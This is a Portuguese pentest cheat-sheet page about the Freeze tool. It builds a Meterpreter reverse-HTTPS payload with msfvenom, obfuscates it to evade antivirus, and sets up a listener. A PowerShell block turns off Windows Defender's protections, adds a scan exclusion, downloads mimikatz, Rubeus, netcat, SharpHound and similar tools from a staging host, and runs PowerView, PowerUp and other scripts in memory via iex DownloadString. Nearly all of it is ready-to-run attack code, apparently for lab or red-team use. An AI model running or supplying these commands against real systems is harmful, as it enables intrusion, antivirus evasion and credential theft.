---
title: "Freeze"
---

# Freeze

Geração de payload Meterpreter ofuscado com [Freeze](https://github.com/optiv/Freeze) para evasão de AV. O Freeze recompila o shellcode em um binário Go com técnicas de ofuscação em memória, evitando detecção por assinatura. O bloco PowerShell desabilita o Defender e baixa o toolset de um servidor de staging.

```shell
# Iniciar listener
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST eth1; set LPORT 443; exploit"

# Gerar payload raw e ofuscar com Freeze
output=cehb_met.exe
cd /home/kali/exp/tools/Freeze
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth1 LPORT=443 EXITFUNC=thread -f raw -o rev.raw
./Freeze -I rev.raw -encrypt -O $output
mv $output ~/exp/eme/
cd ~/exp/eme/
ls -lah $output
```

```powershell
# Desabilitar Defender e baixar toolset
$ip = "192.168.200.2"
$porta = 80

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableEmailScanning $true
Set-MpPreference -DisableScriptScanning $true
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

function Download-IfNotExists { param ([string]$url, [string]$output) if (-not (Test-Path $output)) { wget -UseBasicParsing $url -OutFile $output } else { Write-Host "$output already exists, skipping download." } }

Download-IfNotExists "http://${ip}:${porta}/mimikatz.exe" "mimikatz.exe"
Download-IfNotExists "http://${ip}:${porta}/rubeus.exe" "rubeus.exe"
Download-IfNotExists "http://${ip}:${porta}/nc64.exe" "nc64.exe"
Download-IfNotExists "http://${ip}:${porta}/printspoofer64.exe" "printspoofer64.exe"
Download-IfNotExists "http://${ip}:${porta}/sharphound.exe" "sharphound.exe"
Download-IfNotExists "http://${ip}:${porta}/spoolsample.exe" "spoolsample.exe"
Download-IfNotExists "http://${ip}:${porta}/mimidrv.sys" "mimidrv.sys"
Download-IfNotExists "http://${ip}:${porta}/cehb.exe" "cehb.exe"

iex (New-Object Net.Webclient).DownloadString("http://${ip}:${porta}/powerview.ps1")
iex (New-Object Net.Webclient).DownloadString("http://${ip}:${porta}/powermad.ps1")
iex (New-Object Net.Webclient).DownloadString("http://${ip}:${porta}/powerup.ps1")
iex (New-Object Net.Webclient).DownloadString("http://${ip}:${porta}/powerupsql.ps1")
```
